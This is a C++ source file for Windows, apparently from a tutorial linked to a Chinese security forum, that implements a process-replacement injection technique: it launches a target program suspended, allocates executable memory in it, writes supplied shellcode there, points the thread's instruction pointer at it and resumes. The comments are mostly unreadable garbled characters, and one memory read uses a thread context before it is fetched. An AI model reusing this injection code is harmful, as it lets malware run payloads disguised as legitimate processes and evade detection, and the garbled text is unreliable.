#include "stdafx.h"
#include "ReplaceProcess.h"

//��ϸ���£�https://forum.butian.net/share/825

void ShowError(char *pszText)
{
	char szErr[MAX_PATH] = {0};
	::wsprintf(szErr, "%s Error[%d]\n", pszText, ::GetLastError());
	::MessageBox(NULL, szErr, "ERROR", MB_OK);
}

/*
	���ܽ��̵Ĵ���ԭ������޸�ĳһ���̵��ڴ����ݣ����ڴ���д��Shellcode���룬
���޸ĸý��̵�ִ�����̣�ʹ��ת��ִ��Shellcode,�������̻���ԭ���Ľ��̣���ִ�еĲ������滻��

�����ؼ������㣺
һ��д��Shellcode���ݵ�ʱ�������Ǹ���ִ�����̵ķ�����

CreateProcess �ṩ CREATE_SUSPENDED ��Ϊ�߳̽����������̹���ȴ��ı�־����ʱ���̴߳��ڹ���״̬��������ִ�д���
ֱ��ͨ�� ResumeThread �ָ��̣߳����ɼ���ִ�С�
���൱�ڻ���IPָ�룬ָ��˭ִ��˭���������ǵ�Ŀ����Ǹı�ָ����ָ��
*/

// �������̲��滻�����ڴ�����, ����ִ��˳��
//DWORD dwRunOffset :       Shellcode�п�ʼ��������׵�ַ��ƫ��
BOOL ReplaceProcess(char *pszFilePath, PVOID pReplaceData, DWORD dwReplaceDataSize, DWORD dwRunOffset)
{
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	CONTEXT threadContext = { 0 };
	BOOL bRet = FALSE;
	::RtlZeroMemory(&si, sizeof(si));
	::RtlZeroMemory(&pi, sizeof(pi));
	::RtlZeroMemory(&threadContext, sizeof(threadContext));
	si.cb = sizeof(si);

	// �������̲��������߳�
	bRet = ::CreateProcess(pszFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	if (FALSE == bRet)
	{
		ShowError("CreateProcess");
		return FALSE;
	}

	// ��ȡ��ַ�ķ���: ��ʱcontext�е�EBX��ָ��PEB��ָ��, 
	// ImageBaseAddress��+0x008���λ�ã���������ط�ReadProcessMemory�Ĳ�������PEB+8
	// ���ǿ��Ը��� PEB_LDR_DATA ��ȡ���̻�ַ�Լ�������������ȡ���н���
	 
	DWORD dwProcessBaseAddr = 0;
	::ReadProcessMemory(pi.hProcess, (LPVOID)(8 + threadContext.Ebx), &dwProcessBaseAddr, sizeof(dwProcessBaseAddr), NULL);
	printf("%d\n",dwProcessBaseAddr);

	// ���滻�Ľ���������һ���ڴ� 
	LPVOID lpDestBaseAddr = ::VirtualAllocEx(pi.hProcess, NULL, dwReplaceDataSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (NULL == lpDestBaseAddr)
	{
		ShowError("VirtualAllocEx");
		return FALSE;
	}
	// д���滻������
	bRet = ::WriteProcessMemory(pi.hProcess, lpDestBaseAddr, pReplaceData, dwReplaceDataSize, NULL);
	if (FALSE == bRet)
	{
		ShowError("WriteProcessError");
		return FALSE;
	}

	/*
	ÿ���߳��ں˶���ά����һ��CONTEXT�ṹ�����汣�����߳����е�״̬���߳�Ҳ����eip��
	��������ʹCPU���Լǵ��ϴ����и��߳����е������ˣ��ô����￪ʼ���У�
	��������Ҫ�Ȼ�ȡ�߳������ĵ�״̬��ʹ�õ�GetThreadContext
	*/


	// ��ȡ�߳�����������
	// ע��˴���־��һ��Ҫд!!!
	threadContext.ContextFlags = CONTEXT_FULL;
	bRet = ::GetThreadContext(pi.hThread, &threadContext);

	if (FALSE == bRet)
	{
		ShowError("GetThreadContext");
		return FALSE;
	}


	// �޸Ľ��̵�PE�ļ�����ڵ�ַ�Լ�ӳ���С,�Ȼ�ȡԭ������PE�ṹ�ļ��ػ�ַ
	// ipָ���޸�Ϊ��Ҫִ�е�shellcode,�� �޸��߳���������EIP��ֵΪ������ڴ���׵�ַ + Shellcode�п�ʼ��������׵�ַ��ƫ��
	threadContext.Eip = (DWORD)lpDestBaseAddr + dwRunOffset;

	// ���ù�����̵��߳�������
	bRet = ::SetThreadContext(pi.hThread, &threadContext);
	if (FALSE == bRet)
	{
		ShowError("SetThreadContext");
		return FALSE;
	}
	// �ָ�����Ľ��̵��߳�
	::ResumeThread(pi.hThread);

	return TRUE;
}

